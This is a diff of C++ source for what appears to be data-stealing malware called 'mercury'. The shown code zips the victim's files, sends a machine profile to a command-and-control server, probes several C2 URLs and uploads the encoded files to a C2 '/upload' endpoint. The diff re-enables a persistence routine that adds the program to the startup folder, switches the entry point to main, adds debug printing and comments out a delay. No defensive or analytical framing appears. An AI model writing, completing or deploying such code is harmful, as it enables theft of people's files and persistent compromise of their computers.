@@ -62,7 +62,7 @@ void GenZip() {
 }
 
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+int main() {
     std::wstring uid;
     std::string pubDir = PublicDir();
     std::string zipFile = pubDir + "zipped.zip";
@@ -72,7 +72,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     if (ONETIMERUN) {
         // If the zip file doesn't exist, it's the first run
         if (!std::filesystem::exists(zipFile)) {
-            //PersistOnMachine(); // Add mercury to startup folder
+            PersistOnMachine(); // Add mercury to startup folder
             GenZip();           // Process files and create a zip file
 
             // Try connecting to Google and then connect to all C2 URLs to find a live C2
@@ -87,6 +87,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
                     nlohmann::json metadata = GenFileMetadata(zipDestStr, CHUNK_SIZE);
                     JsonProfile["file_metadata"] = metadata;
+                    std::cout << metadata << std::endl;
 
                     // Send client's profiler to the server 
                     std::string response = SendData(L"POST", PC2, L"", JsonProfile, L"");
@@ -135,7 +136,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
                 std::wstring FileUploadURL = C2 + L"/upload";
                 std::string FilerResponse = SendData(L"POST", FileUploadURL, L"", EncodedBytes, L"");
                 std::cout << "JSON response for /upload: " << FilerResponse << std::endl;
-                Sleep(2000);
+                //Sleep(2000);
             }
             
 
